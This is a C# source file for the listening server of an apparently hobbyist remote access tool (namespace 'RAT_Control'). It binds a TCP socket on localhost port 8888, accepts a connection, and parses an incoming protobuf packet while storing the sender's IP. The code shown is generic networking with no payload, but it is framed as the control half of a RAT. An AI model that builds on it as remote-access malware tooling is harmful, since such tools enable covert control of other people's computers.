using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using Info;

#pragma warning disable 0618

namespace RAT_Control
{


   public static class packGlobal
    {
        public static Info.Packet myPacket;
        public static string IP;
    }
    class Server
    {
        
        int connectionNum = 0;
        const string DEFAULT_SERVER = "localhost";
        const int DEFAULT_PORT = 8888;

        //Server socket stuff 
        System.Net.Sockets.Socket serverSocket;
        System.Net.Sockets.SocketInformation serverSocketInfo;

        //Client socket stuff 
        System.Net.Sockets.Socket clientSocket;
        //System.Net.Sockets.SocketInformation clientSocketInfo;

        public string Startup()
        {
            // The server always starts up on the localhost, using the default port 
            IPHostEntry hostInfo = Dns.GetHostByName(DEFAULT_SERVER);
            IPAddress serverAddr = hostInfo.AddressList[0];
            var serverEndPoint = new IPEndPoint(serverAddr, DEFAULT_PORT);

            // Create a listener socket and bind it to the endpoint 
            serverSocket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
            serverSocket.Bind(serverEndPoint);

            return serverSocket.LocalEndPoint.ToString();
        }

        public string Listen()
        {
            //New socket for each client, new packet instance for each client
            int backlog = 0;
            try
            {
                serverSocket.Listen(backlog);
                return "Server listening";
            }
            catch (Exception ex)
            {
                return "Failed to listen" + ex.ToString();
            }
        }

        public void receiveData()
        {

            System.Net.Sockets.Socket receiveSocket;
            byte[] buffer = new byte[1024];
            

            receiveSocket = serverSocket.Accept();
            

            //Get the IP of connection computer
            IPEndPoint remoteIPEndPoint = receiveSocket.RemoteEndPoint as IPEndPoint;

            //Check for duplicates
            packGlobal.IP = remoteIPEndPoint.Address.ToString();
            
          

            int bytesrecd = receiveSocket.Receive(buffer);

            //Trim Array so theres no 0's in the buffer, otherwise protobuf shits itself
            Array.Resize(ref buffer, bytesrecd);

           // Info.Packet myPacket;

            packGlobal.myPacket = Info.Packet.Parser.ParseFrom(buffer);
            
            receiveSocket.Close();


            //System.Text.Encoding encoding = System.Text.Encoding.UTF8;

          // Global.currentBuffer = encoding.GetString(buffer);
        }
       
    }

}
